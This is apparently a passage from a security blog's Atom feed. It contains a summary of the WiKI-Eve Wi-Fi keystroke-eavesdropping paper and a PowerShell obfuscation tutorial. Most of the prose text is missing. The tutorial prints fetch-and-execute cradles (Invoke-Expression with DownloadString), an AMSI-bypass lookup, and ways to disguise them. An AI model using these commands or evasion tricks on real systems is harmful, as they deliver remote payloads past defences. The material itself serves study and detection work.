data-hmacdigest="4291535d607e769a7f44db08ecf171aff5e82cf5e1a6dbac4a0d43e7e1288c4d">2c151d14a1692af99fa0c574696ab642630118ededbcd92b05c804024ee0b0d51c56116b5bab9e45baeea968e6dd944707ea6a5b481faee30b12db312aeff2b8fe1dc3fec9baba996efd048c6df6dbe1a80138920fb6b0f49839787021eb0efa144c03367e825fbffae3fd9ac8691c0aa3512b16833eae95b678fd5347ce40a22b6b7c92bc492671f01da6a3cbfc8def34719437efdf420f92dca41c3db9c9349861e5f07743d66d58832a512caf3983a29a212f80f03b2fe8ab117840b6b877bf40c62014bb4715e7ad9cb9029202a0a44fcec52b9add24865ece6ea75a99d373b083dbe3da5629e96ae13c8194b16df05987085b9bb184d6ef9e60b06e8a895a84cb48a936a6e0b4c52d829613143a1268ebd4317c066f8f4ca49ae861ab31c6231f00649891399c0ab9543043f7470ba598f2c5fe48754a19ce7a6d785003378104c1c8b24c93a20a081345488565ab5ce853b248db1811ce6156a29415c61ce387a35fa7d9736bb4bfa7feea8c1aa58cca0ee79340b1998c52697f06a4d6f4d969ca85968121f346a5e549933a80d01709c330318d3862b71f87a09f017429364c2fb86c0b67ad75347b69931482ed5a79f8ec28e2f164922878be3c2e6d2b080181fb5c18a5cfe9a23e42c0d0e3338494c73c2558c50036b01dec861a40949010f388096656999be852f946eff617ce3cb60b92ca73c3e6cfc55fdfae298ab3aa2f51138fe3a14fa26245742fc4dcec6fa8758bd9882bc2a4bf8db6e63d05d8d9050b565ee045278090044ec210b5d5d2f53f52172cef856656a0cbcd9f3c7fc452fde7b83c52450a296ea9c6db46ea741d2e66b2bf49771e1764c63c74f5ec3a2b3f7fb87d98f6369f7e10baa2132801f030708d79b8408f3470658d3f2d441a9e0386ed120792266ad0fcf8006e21d59a3680f543a7454a34c56de48f05be00717568316ef73b01f7d11049ac7bb43cdd37cdc58ef598862772e778381382ca32032e07c172e1b18bb7ff2846aa31300ed8d1ebed03ef3901c0aed5c39b4b09be541c0bdde84d821abb051c39131f49b46b61f93cd2d2d6011d32926a2c433abcaed7f8793c988b19230de840e9a594ef7e6c179722d2b3248533e54aa7bac217f478e9c5ca15037bebb8100639334476520e7267013b6ebb99f6c439d3c9d328ebadeffc5a1081526396e262f5acabd4c1854792b2ff17b088bd4d526feab3545cf55f2126a38b5293193fc90c47d0c344f270b748867dc76d615f83ea27ec85b14311e3462861ed0a2f084ba6e4b3f712c4978f71a06d6be25309ba916cbfe8061e08dee6ac4c5d0325ed9c5b3be98a4752b146b263d09044c854746f6b53d80ecfa894da1d275b56fb405a6f2279a4b95a992af09448d47e84494ae84f002ab2fa8d60dba997bd665a557088401b8d7ee9222573600901be9062de8a66aa54c6c71e1475c8a47d5f64b8c75b07eeb96776862660a81beba2c440426f64cbef8ee523526424f5bb9b38706e6056b487e5c1afd6e73a6bde5f7bddf4c7c279748b150942df702318811ca3f59ab96c8797b8d4561b20da56c6490e7273ad6e5ec9dc000a7784be0a621b594d90563cdfdb862f8e88b0edff1bb78951e13c52937aaaa9f84e027508a270d5ab050b252951aebc8fd5eb6583d2a4e9e0db13cf3cb53ab55fd4218606eeff5db03073be9e9ad393dbd41dc2233ad1815ba918510a9a91892ed1f31c238c3622a82c78aa62463de144abc3c923f5abf8206e9295f179884168287c18e34954c4931b873c8309e28e2350631af432785e29c67748cbba30b3f48cd376ea874cb9ee35938a79e7bbbe0f61574d06012313547a708694cfff96340d3eb381feded2d7b22b924272e80a92b92e5b1fc215cdcc1c284d7da1b9ffd0e4f9a439b91e5f989aa01dd430bfa29f4749e162e73e5580612402fc68cf7bbd5cf1970c5d606093870abd76e8bfb242bdd9c90ffee936f655e824511e6bdf2ae4210c7687c63436968bed4e6d9c1641d33f64507629943b17e85943000d1bbc9482d7872bfe78838c02075bd84617c0f5b4b343f877f887aa9b3eeddb237134a2c36b0011bf65c7f1c2e3d562c97d22cbb679577f63a6d60d29284d08c6349d7244cd7646b74efd294b1b45dcba1ce49e70a6e2902346e4dc217e9eb5baa5061e228760ec64e5af52a649853bf01751c65468d0f372371d961be9a74294838c7165d1f8cfe967b7a5f245a999eced9e619683a78b1de75c20f6460f6edf11e44194fbf40d66508ce97d258cddad89a77e329cce04aa9e362deb32e3959734ad74ae59376134552d64439438e5d9153227a54b5959df1e78a83b67be384630e1b647eb503a4728347b471e3ebac660cec35d0953a83b9682efad5a0177768232e2fe69ccc81debd9a978fa499d2ca621d9ffbff489d73c9d0c80e8c46f19cd5afeaca71ae2a09e2b2766f7f03c496610a498761e3bb56668a0426b1ef88a413ef8a6d8730f2a26ff6b182d21339f6d1e0d1b6a67d3fd7c3c00cd044ad8043961b5f9adf27140c639404d606c8e2aee3a47cf195dfd5d8d35cc5e8ed5a73fa13ad0a2474e3b406b04db69f1d4227e8c02d26dd51c52bb3380e5bd232279b3c65c90a279d819c120da91a528fe0e5406a2e1c7db28588d856f0c812dcb480cd25ee1f05bee5255e7640f7c80fd49b3324e99246483e8637cf6755bb1897dcb4618084e06d8c6b3f0239c2b6f45bf1c7add1f91caa6f1b0e4cfceaa3b4eb8ca0e6e1f38e3fb976e6361c9f562e9911085881610df12c0beb20e94938937e62292e3ecdeb6ed896a3ddff1e2a864b091fc267faf2c60d6b5a154feaabed14468d2e8d60d37ef3a6875c40c224f4027466b4daf40258335e5ae5cd7a2348ff2c37f46248123bcd895265e7988c1c6589376348396ed5c8f7a50087b3a3b5b84bf848dcae25e3b4f314e3336f23dcd95abf96e8970757170854b90da421682fe6055bb2266dfc7603630b7f663f50567aa68c3bf5f4e5651b8e49c8f93e80fbc14edce47e85e1c02519e02a8aa2f55b1f9345a8d1eafb40fc0756cdc99b8400f3b799d2482ddfadef6ca7c41027b42880f75733ee52a2a7e5a6f688e9dfd0cb3d03285d676f49e328505444b5cf60ad742aa9bcda3a051d2acb4ad125aa7f7e21cf6b62ab5493b2594711c68eebc4d15d3c7f2177dbad2c7fb9a29e545f09362626a788dd8fd3ba78bec559257e815fd30648799a7d8d189a428f427296396dc6359478bb3d909215ebef4c815592ddbcb9a595ec223c50e28b613fd9c4b344b7e9cba6f941752037af843e60e2a704006ab5a50b02001bd7b4824d2b8cabd1f943f90ee9de894ecef96ad457ec0a429951cee9581087aba6244ca1f7f222f08e411f200427f818c36f1da422e10e67f135cbc4d456772dc5bc4b03e230e40848cdae03554f159e320f5a24d8a9d7382ceace84cce209bb48c0c94c99f842e29faee9049851300c89d4d3755b857c7f9f592040c2b26bf64b7293767670c6f770569122f2dee7940cd851a651be2f43f18e924901daf37818d2867b4e4c2f1eac7be880161d78baa528ca2</script>  <div class="hbe hbe-content">    <div class="hbe hbe-input hbe-input-default">      <input class="hbe hbe-input-field hbe-input-field-default" type="password" id="hbePass">      <label class="hbe hbe-input-label hbe-input-label-default" for="hbePass">        <span class="hbe hbe-input-label-content hbe-input-label-content-default">Hey, password is required here.</span>      </label>    </div>  </div></div><script data-pjax src="/lib/hbe.js"></script><link href="/css/hbe.style.css" rel="stylesheet" type="text/css">]]></content>
    
    
    <summary type="html">Here&#39;s something encrypted, password is required to continue reading.</summary>
    
    
    
    <category term="re" scheme="https://wd-2711.tech/categories/re/"/>
    
    
  </entry>
  
  <entry>
    <title>recentlyThink-4</title>
    <link href="https://wd-2711.tech/2023/10/19/recentlyThink-4/"/>
    <id>https://wd-2711.tech/2023/10/19/recentlyThink-4/</id>
    <published>2023-10-18T16:03:40.000Z</published>
    <updated>2023-10-19T05:34:30.000Z</updated>
    
    <content type="html"><![CDATA[<h1 id=""><a href="#" class="headerlink" title=""></a></h1><p>&emsp;hhh521</p><span id="more"></span><p><img src="/images/recentlyThink-4/image-20231019130502196.png" alt="image-20231019130502196" style="zoom:67%;" /></p><p>&emsp;1800</p><p>&emsp;</p><p><img src="/images/recentlyThink-4/image-20231019131216881.png" alt="image-20231019131216881" style="zoom:67%;" /></p><p>&emsp;</p><p><img src="/images/recentlyThink-4/image-20231019131436147.png" alt="image-20231019131436147" style="zoom:67%;" /></p><p>&emsp;ms</p><p>&emsp;</p><p>&emsp;50</p><p>&emsp;<code></code></p>]]></content>
    
    
    <summary type="html">&lt;h1 id=&quot;&quot;&gt;&lt;a href=&quot;#&quot; class=&quot;headerlink&quot; title=&quot;&quot;&gt;&lt;/a&gt;&lt;/h1&gt;&lt;p&gt;&amp;emsp;hhh521&lt;/p&gt;</summary>
    
    
    
    <category term="" scheme="https://wd-2711.tech/categories/%E6%9D%82%E8%AE%B0/"/>
    
    
  </entry>
  
  <entry>
    <title>Password-Stealing-without-Hacking</title>
    <link href="https://wd-2711.tech/2023/10/18/Password-Stealing-without-Hacking/"/>
    <id>https://wd-2711.tech/2023/10/18/Password-Stealing-without-Hacking/</id>
    <published>2023-10-18T06:17:03.000Z</published>
    <updated>2023-10-19T04:41:46.000Z</updated>
    
    <content type="html"><![CDATA[<h1 id="WiKI-Eve-Wi-Fi-Enabled-Practical-Keystroke-Eavesdropping"><a href="#WiKI-Eve-Wi-Fi-Enabled-Practical-Keystroke-Eavesdropping" class="headerlink" title="WiKI-Eve:Wi-Fi Enabled Practical Keystroke Eavesdropping"></a>WiKI-Eve:Wi-Fi Enabled Practical Keystroke Eavesdropping</h1><h2 id=""><a href="#" class="headerlink" title=""></a></h2><p>&emsp;Wi-Fi  Wi-Fi CSI Wi-Fi  WiKI-Eve <code></code> WiKI-Eve  Wi-Fi  BFI<code> BFI  AP Wi-Fi </code>WiKI-Eve WiKI-Eve  88.9% 65.8%</p><p>&emsp;</p><span id="more"></span><h2 id=""><a href="#" class="headerlink" title=""></a></h2><p>&emsp;123</p><p>&emsp;Wi-Fi CSI  </p><p><img src="/images/Password-Stealing-without-Hacking/image-20231018150244446.png" alt="image-20231018150244446" style="zoom:67%;" /></p><p>&emsp; CSI  Wi-Fi <code> Wi-Fi </code> CSI </p><p>&emsp; WiFi 5 WiFi  BFI CSI <code>BFI  (AP) AP AP</code> AP  CSI  Wi-Fi  BFI  Wi-Fi  BFI</p><p>&emsp;1<code></code>2 BFI  BFI</p><p>&emsp; WiKI-Eve  <code>BFI </code>1<code></code><code></code>2</p><ul><li> BFI Wi-Fi </li><li> WiKI-Eve </li><li>BFI</li></ul><h2 id=""><a href="#" class="headerlink" title=""></a></h2><h3 id=""><a href="#" class="headerlink" title=""></a></h3><p>&emsp; Bob  Wi-Fi  (AP) BobAPEve  AP  Bob  Wi-Fi Bob </p><p>&emsp;WiKI-Eve  (NIC) Bob  AP  Wi-Fi CSI (a) WiKI-Eve  o-IKI Wi-Fi NIC  Bob  AP </p><p><img src="/images/Password-Stealing-without-Hacking/image-20231018161212127.png" alt="image-20231018161212127" style="zoom:67%;" /></p><p>&emsp; (OKI) (b)  Eve  Wi-Fi NIC  AP Bob Eve  CSI  Bob <code> CSI  OKI o-IKI  BFI  KI SNR</code> IKI  Eve  AP o-IKI  OKI  Eve  Bob  OKI </p><h3 id="-BFI"><a href="#-BFI" class="headerlink" title=" BFI"></a> BFI</h3><p>1BFI </p><p>2BFI  CSI IKI  Wi-Fi  BFI  CSI  $H = Y/X$ $X$  $Y$  (Tx)  (Rx) BFI  H Tx  Rx  Tx  AP  AP BFI  IKI  CSI  KI </p><p>&emsp; iPerf  BFI  CSI  BFI </p><p><img src="/images/Password-Stealing-without-Hacking/image-20231018163222028.png" alt="image-20231018163222028" style="zoom:67%;" /></p><p>&emsp; CSI  KI 46</p><p><img src="/images/Password-Stealing-without-Hacking/image-20231018163437352.png" alt="image-20231018163437352" style="zoom:67%;" /></p><h2 id="WiKI-Eve"><a href="#WiKI-Eve" class="headerlink" title="WiKI-Eve"></a>WiKI-Eve</h2><p>&emsp;123BFI4 BFI 5 BFI  KI </p><p><img src="/images/Password-Stealing-without-Hacking/image-20231018163904402.png" alt="image-20231018163904402" style="zoom:67%;" /> </p><h3 id="1-amp-2"><a href="#1-amp-2" class="headerlink" title="1&amp;2"></a>1&amp;2</h3><p>&emsp;Eve  MAC  Bob  MAC  <code> IKI  OKI </code></p><p>&emsp; Bob  MAC Eve  Bob Eve jEve  IP <code> IP  IP </code></p><h3 id="3-amp-4"><a href="#3-amp-4" class="headerlink" title="3&amp;4"></a>3&amp;4</h3><p>&emsp; BFI BFI  CSI $H$  AP   SVD $H$  $H=USV$  $V$  BFI $U$  $S$  Bob  Wi-Fi   CSI  CSI  SVD  BFI </p><p>&emsp; BFI Eve  Wi-Fi  Wireshark  802.11ac <code>VHT </code> BFI BFI Tx  Rx BFI BFI WiKI-Eve  BFI </p><h3 id="5"><a href="#5" class="headerlink" title="5"></a>5</h3><p>&emsp; WiKI-Eve  BFI-KI BFI  KI KI  KI </p><h4 id=""><a href="#" class="headerlink" title=""></a></h4><p>&emsp; WindTalker <code> CSI </code> CSI  A  B </p><p><img src="/images/Password-Stealing-without-Hacking/image-20231018174224520.png" alt="image-20231018174224520" style="zoom:67%;" /></p><p>&emsp;WINK series learning KI   WINK  KI <code> CSI</code></p><p><img src="/images/Password-Stealing-without-Hacking/image-20231018184339999.png" alt="image-20231018184339999" style="zoom:67%;" /></p><p>&emsp;WiKI-Eve  WindTalker <code>WiKI-Eve </code><code> KI  KI </code>WiKI-Eve </p><h4 id=""><a href="#" class="headerlink" title=""></a></h4><p>&emsp;BFI  BFI  Bob </p><p><img src="/images/Password-Stealing-without-Hacking/image-20231018225636845.png" alt="image-20231018225636845" style="zoom:67%;" /></p><p>&emsp; (CFAR)  BFI  Bob  K  L  BFI CFAR  W  W  K  K $W=\alpha\times\frac{L}{K}$ $N$ $N=\beta\times\frac{L}{K}$ $\alpha$  $\beta$  BFI 175249</p><h4 id=""><a href="#" class="headerlink" title=""></a></h4><p>&emsp; KI  CNN BFI  CNN  CNN <code> CNN </code></p><p>&emsp;15-1-36-1-84-1-2</p><p><img src="/images/Password-Stealing-without-Hacking/image-20231019110518474.png" alt="image-20231019110518474" style="zoom:67%;" /></p><p>&emsp; KI <code></code> WiKI-Eve  KI </p><p><img src="/images/Password-Stealing-without-Hacking/image-20231019111236393.png" alt="image-20231019111236393" style="zoom:67%;" /></p><p>&emsp; BFI 14-1-25-1-3 $x$  $G_f$  $G_c$  $G_d$ $G_c$  $y$$G_d$  $\Delta\in{0,1}$ 0/1 / $G_d$  $\Delta$ GRL $G_d$ $G_f$  CNN </p><p>&emsp; $G<em>f$ $G_c$  $G_d$  $\theta</em>{\mathbf{f}}$$\theta<em>{\mathbf{c}}$ $\theta</em>{\mathbf{d}}$</p><script type="math/tex; mode=display">(\hat{\theta}_{\mathrm{f}},\hat{\theta}_{\mathrm{c}})=\arg\min_{\theta_{\mathrm{f}},\theta_{\mathrm{c}}}\mathcal{L}(y,\Delta,\mathbf{x}),\quad\hat{\theta}_{\mathrm{d}}=\arg\max_{\theta_{\mathrm{d}}}\mathcal{L}(y,\Delta,\mathbf{x})</script><p>&emsp;$\mathcal{L}(y,\Delta,\boldsymbol{x})=\mathcal{L}<em>{\mathrm{C}}(y,G</em>{\mathrm{C}}(G<em>{\mathrm{f}}(\boldsymbol{x})))-\lambda\mathcal{L}</em>{\mathrm{d}}(\Delta,G<em>{\mathrm{d}}(G</em>{\mathrm{f}}(\boldsymbol{x}))$$\mathcal{L}<em>{\mathrm{C}}$$\mathcal{L}</em>{\mathrm{d}}$$G_c$$G_d$$G_d$  BFI 4-1-24-1-2 x </p><h4 id="-BFI-"><a href="#-BFI-" class="headerlink" title=" BFI "></a> BFI </h4><p>&emsp;WiKI-Eve  iPerf  AP  6  (a)  20%2  (b)  20%  80%  20%</p><p><img src="/images/Password-Stealing-without-Hacking/image-20231019120941475.png" alt="image-20231019120941475" style="zoom:67%;" /></p><p>&emsp;SRA $\Delta t=1s$ 50%BFI50%SRASRA  $f_s$ [0, 1]-1 SRA BFI $x_t$ $t$  SRA  $y_t$</p><p>&emsp;SRA  AE TCNLSTMTCN  TCN-AE  BFI </p>]]></content>
    
    
    <summary type="html">&lt;h1 id=&quot;WiKI-Eve-Wi-Fi-Enabled-Practical-Keystroke-Eavesdropping&quot;&gt;&lt;a href=&quot;#WiKI-Eve-Wi-Fi-Enabled-Practical-Keystroke-Eavesdropping&quot; class=&quot;headerlink&quot; title=&quot;WiKI-Eve:Wi-Fi Enabled Practical Keystroke Eavesdropping&quot;&gt;&lt;/a&gt;WiKI-Eve:Wi-Fi Enabled Practical Keystroke Eavesdropping&lt;/h1&gt;&lt;h2 id=&quot;&quot;&gt;&lt;a href=&quot;#&quot; class=&quot;headerlink&quot; title=&quot;&quot;&gt;&lt;/a&gt;&lt;/h2&gt;&lt;p&gt;&amp;emsp;Wi-Fi  Wi-Fi CSI Wi-Fi  WiKI-Eve &lt;code&gt;&lt;/code&gt; WiKI-Eve  Wi-Fi  BFI&lt;code&gt; BFI  AP Wi-Fi &lt;/code&gt;WiKI-Eve WiKI-Eve  88.9% 65.8%&lt;/p&gt;
&lt;p&gt;&amp;emsp;&lt;/p&gt;</summary>
    
    
    
    <category term="papers" scheme="https://wd-2711.tech/categories/papers/"/>
    
    
  </entry>
  
  <entry>
    <title>ps-obfuscation</title>
    <link href="https://wd-2711.tech/2023/10/15/ps-obfuscation/"/>
    <id>https://wd-2711.tech/2023/10/15/ps-obfuscation/</id>
    <published>2023-10-15T02:59:20.000Z</published>
    <updated>2023-10-16T16:17:38.000Z</updated>
    
    <content type="html"><![CDATA[<h1 id="powershell"><a href="#powershell" class="headerlink" title="powershell"></a>powershell</h1><p>&emsp;powershell<code>.net</code>ps<code>DownloadString</code>//<code></code><code>Marshall</code><code></code>psWindows APIPowerShell</p><span id="more"></span><h2 id="powershell"><a href="#powershell" class="headerlink" title="powershell"></a>powershell</h2><h4 id="ExecutionPolicy"><a href="#ExecutionPolicy" class="headerlink" title="ExecutionPolicy"></a>ExecutionPolicy</h4><p>&emsp;powershell</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Restricted</span><br><span class="line">AllSigned</span><br><span class="line">RemoteSigned</span><br><span class="line">Unrestricted</span><br><span class="line">Bypass</span><br></pre></td></tr></table></figure><p>&emsp;<code>ExecutionPolicy</code><code>Restricted</code><code>RemoteSigned</code><code>powershell -EP bypass</code><code>powershell -ExecutionPolicy bypass</code></p><h4 id="EncodedCommand"><a href="#EncodedCommand" class="headerlink" title="EncodedCommand"></a>EncodedCommand</h4><p>&emsp;Powershell  Base64 <code>powershell -EncodedCommand &#39;Base64 &#39;</code></p><h4 id="NonInteractive-NonI"><a href="#NonInteractive-NonI" class="headerlink" title="NonInteractive(NonI)"></a>NonInteractive(NonI)</h4><p>&emsp;</p><h4 id="NoProfileNoP"><a href="#NoProfileNoP" class="headerlink" title="NoProfileNoP"></a>NoProfileNoP</h4><p>&emsp;powershellpowershell<code>Powershell</code>ExecutionPolicy</p><h4 id="Sta"><a href="#Sta" class="headerlink" title="Sta"></a>Sta</h4><p>&emsp; COMCOM COM</p><h4 id=""><a href="#" class="headerlink" title=""></a></h4><p>&emsp;ps</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">powershell -NoP -sta -NonI -W Hidden -Enc</span><br></pre></td></tr></table></figure><h2 id="powershell"><a href="#powershell" class="headerlink" title="powershell"></a>powershell</h2><h3 id=""><a href="#" class="headerlink" title=""></a></h3><p>&emsp;<code>system</code><code>New-Object System.Net.WebClient</code> <code>New-Object Net.WebClient</code></p><h3 id=""><a href="#" class="headerlink" title=""></a></h3><h4 id=""><a href="#" class="headerlink" title=""></a></h4><p>&emsp;<code>&quot;http://127.0.0.1/powershell&quot;</code><code>&quot;ht&quot;+&quot;tp://127.0.0.1/powershell&quot;</code></p><h4 id=""><a href="#" class="headerlink" title=""></a></h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$value1 = &quot;Onlyf8&quot;</span><br></pre></td></tr></table></figure><p>&emsp;</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$value1 = &quot;Oxxxaaanaaaabbbxlxxxaaaabbbbyfaaaaxxxxbb8&quot;</span><br><span class="line">$value1.Replace(&quot;x&quot;,&quot;&quot;).Replace(&quot;a&quot;,&quot;&quot;).Replace(&quot;b&quot;,&quot;&quot;)</span><br></pre></td></tr></table></figure><p>&emsp;</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$value1_=[Ref].Assembly.GetType((&#x27;System.Management.Automation.AmsiUtils&#x27;));</span><br></pre></td></tr></table></figure><p>&emsp;</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$value1_=[Ref].Assembly.GetType(((&#x27;&#123;4&#125;&#123;0&#125;&#123;9&#125;tem.&#123;3&#125;ana&#123;6&#125;ement.&#123;8&#125;&#123;2&#125;t&#123;7&#125;mati&#123;7&#125;n.&#123;8&#125;m&#123;9&#125;i&#123;5&#125;ti&#123;1&#125;&#123;9&#125;&#x27;)-f&#x27;y&#x27;,&#x27;l&#x27;,&#x27;u&#x27;,&#x27;M&#x27;,&#x27;S&#x27;,&#x27;U&#x27;,&#x27;g&#x27;,&#x27;o&#x27;,&#x27;A&#x27;,&#x27;s&#x27;));</span><br></pre></td></tr></table></figure><h4 id=""><a href="#" class="headerlink" title=""></a></h4><p>&emsp;<code>&quot;hello&quot;</code><code>&quot;hELLO&quot;</code></p><h4 id=""><a href="#" class="headerlink" title=""></a></h4><p>&emsp;<code>&quot;hello&quot;</code><code>&quot;he   llo&quot;</code></p><h4 id=""><a href="#" class="headerlink" title=""></a></h4><p>&emsp;<code>&quot;iex&quot;</code><code>&amp;(&quot;iex&quot;)</code></p><h3 id="Invoke"><a href="#Invoke" class="headerlink" title="Invoke"></a>Invoke</h3><p>&emsp;Invoke</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Invoke-Expression (New-Object System.Net.WebClient).DownloadString(&quot;xxx&quot;)</span><br></pre></td></tr></table></figure><p>&emsp;</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Invoke-Expression (New-Object System.Net.WebClient).(&quot;DownloadString&quot;).Invoke(&quot;xxx&quot;)</span><br></pre></td></tr></table></figure><h3 id="NewScriptBlock"><a href="#NewScriptBlock" class="headerlink" title="NewScriptBlock"></a>NewScriptBlock</h3><p>&emsp;</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Invoke-Expression (New-Object System.Net.WebClient).DownloadString(&quot;xxx&quot;)</span><br></pre></td></tr></table></figure><p>&emsp;</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">.($ExecutionContext.InvokeCommand.NewScriptBlock(&#x27;invoke-expression (New-Object System.Net.WebClient).DownloadString(&quot;xxx&quot;)&#x27;))</span><br></pre></td></tr></table></figure><h3 id="invoke-command-xxx-icm"><a href="#invoke-command-xxx-icm" class="headerlink" title="invoke-command{xxx}icm"></a>invoke-command{xxx}icm</h3><p>&emsp;</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Invoke-Expression (New-Object System.Net.WebClient).DownloadString(&quot;xxx&quot;)</span><br></pre></td></tr></table></figure><p>&emsp;</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">invoke-command&#123;Invoke-Expression (New-Object System.Net.WebClient).DownloadString(&quot;xxx&quot;)&#125;</span><br></pre></td></tr></table></figure><p>&emsp;<code>invoke-command</code><code>icm</code></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">icm&#123;Invoke-Expression (New-Object System.Net.WebClient).DownloadString(&quot;xxx&quot;)&#125;</span><br></pre></td></tr></table></figure><h3 id=""><a href="#" class="headerlink" title=""></a></h3><p>&emsp;</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Invoke-Expression (New-Object System.Net.WebClient).DownloadString(&quot;xxx&quot;)</span><br></pre></td></tr></table></figure><p>&emsp;</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Invoke-Expression $test = New-Object System.Net.WebClient</span><br><span class="line">$test.DownloadString(&quot;xxx&quot;)</span><br></pre></td></tr></table></figure><h3 id=""><a href="#" class="headerlink" title=""></a></h3><p>&emsp;</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Invoke-Expression (New-Object System.Net.WebClient).DownloadString(&quot;xxx&quot;)</span><br></pre></td></tr></table></figure><p>&emsp;</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Invoke-Expression (New-Object System.Net.WebClient).&quot;DownloadString&quot;.Invoke(&quot;xxx&quot;)</span><br></pre></td></tr></table></figure><p>&emsp;<code>Invoke</code><code></code></p><p>&emsp;</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Invoke-Expression (New-Object (&quot;System.Net.WebClient&quot;)).&quot;DownloadString&quot;.Invoke(&quot;xxx&quot;)</span><br></pre></td></tr></table></figure><h3 id=""><a href="#" class="headerlink" title=""></a></h3><p>&emsp;</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Invoke-Expression (New-Object System.Net.WebClient).DownloadString(&quot;http://127.0.0.1/1&quot;)</span><br></pre></td></tr></table></figure><p>&emsp;</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Invoke-Expression (New-Object System.Net.WebClient).DownloadString(&quot;`htt`p`:`/`/`1`2`7`.`0`.`0`.`1`/`1&quot;)</span><br></pre></td></tr></table></figure><p>&emsp;</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">`a----</span><br><span class="line">`b----</span><br><span class="line">`f----</span><br><span class="line">`n----</span><br><span class="line">`r----</span><br><span class="line">`t----</span><br><span class="line">`v----</span><br></pre></td></tr></table></figure><h3 id=""><a href="#" class="headerlink" title="*"></a>*</h3><p>&emsp;New-Object<code>*</code></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&amp;(Get-Command New-Obje*)</span><br><span class="line">&amp;(Get-Command N*-O*)</span><br><span class="line">&amp;(GCM *w-O*)</span><br><span class="line">&amp;(COMMAND *w-*ct)</span><br></pre></td></tr></table></figure><h3 id=""><a href="#" class="headerlink" title=""></a></h3><p>&emsp;DownloadString</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Invoke-Expression (New-Object System.Net.WebClient).&quot;DownloadString&quot;.Invoke(&quot;xxx&quot;)</span><br></pre></td></tr></table></figure><p>&emsp;<code>`$_</code> </p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Invoke-Expression (New-Object System.Net.WebClient).PsObject.Methods|Where-Object &#123;$_.Name -like &quot;*own*d*ing&quot;&#125;(&quot;http://127.0.0.1/1&quot;)</span><br></pre></td></tr></table></figure><h3 id=""><a href="#" class="headerlink" title=""></a></h3><p>&emsp;</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cmd.exe /c &quot;set cmd=Write-Host ENV-Fore Green&amp;&amp;powershell IEX $env:cmd&quot;</span><br></pre></td></tr></table></figure><p>&emsp;<code>-c</code></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">set cmd=Write-Host ENV-Fore Green</span><br></pre></td></tr></table></figure><p>&emsp;cmdps<code>Write-Host ENV-Fore Green</code>pscmd</p><p>&emsp;</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">powershell IEX $env:cmd</span><br></pre></td></tr></table></figure><p>&emsp;</p><h3 id=""><a href="#" class="headerlink" title=""></a></h3><p>&emsp;</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Invoke-Expression (New-Object Net.WebClient).DownloadString(&#x27;http://127.0.0.1/1&#x27;)</span><br></pre></td></tr></table></figure><p>&emsp;</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$re = &quot;)&#x27;1/1.0.0.721//:ptth&#x27;(gnirtSdaolnwoD.)tneilCbeW.teN tcejbO-weN(&quot;;</span><br><span class="line">Invoke-Expression ($re[-1..-($re.Length)] -Join &#x27;&#x27;)</span><br></pre></td></tr></table></figure><h3 id="base64"><a href="#base64" class="headerlink" 